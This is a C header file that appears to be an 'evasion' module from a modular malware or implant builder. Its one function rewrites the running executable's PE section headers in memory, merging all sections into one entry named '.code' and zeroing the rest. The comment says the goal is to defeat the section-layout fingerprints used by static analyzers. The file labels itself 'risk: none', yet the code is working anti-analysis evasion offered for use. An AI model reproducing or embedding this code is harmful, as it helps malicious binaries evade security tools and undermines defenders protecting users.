// chunk: evasion/section_merge
// depends: (none)
// provides: merge_pe_sections
// headers: windows.h
// risk: none
// note: Modifies PE section headers in memory to appear as a single merged section.
//       Changes the section layout signature that static analyzers use to fingerprint
//       compiler-generated binaries. Makes the PE look like a packed/custom binary
//       rather than a standard MinGW output.

#ifndef CHUNK_SECTION_MERGE
#define CHUNK_SECTION_MERGE

#include <windows.h>

static void merge_pe_sections(void) {
    HMODULE base = GetModuleHandleA(NULL);
    if (!base) return;

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *pe = (IMAGE_NT_HEADERS *)((BYTE *)base + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(pe);
    WORD num_sections = pe->FileHeader.NumberOfSections;

    if (num_sections < 2) return;

    DWORD old;
    VirtualProtect(pe, 4096, PAGE_READWRITE, &old);

    /* Find the combined extent of all sections */
    DWORD first_va = sec[0].VirtualAddress;
    DWORD last_end = 0;
    DWORD combined_chars = 0;

    for (WORD i = 0; i < num_sections; i++) {
        DWORD sec_end = sec[i].VirtualAddress + sec[i].Misc.VirtualSize;
        if (sec_end > last_end) last_end = sec_end;
        combined_chars |= sec[i].Characteristics;
    }

    /* Rename first section to something generic */
    memcpy(sec[0].Name, ".code\0\0\0", 8);
    sec[0].VirtualAddress = first_va;
    sec[0].Misc.VirtualSize = last_end - first_va;
    sec[0].SizeOfRawData = last_end - first_va;
    sec[0].Characteristics = combined_chars;

    /* Zero remaining section headers */
    for (WORD i = 1; i < num_sections; i++) {
        memset(&sec[i], 0, sizeof(IMAGE_SECTION_HEADER));
    }

    pe->FileHeader.NumberOfSections = 1;
    VirtualProtect(pe, 4096, old, &old);
}

#endif
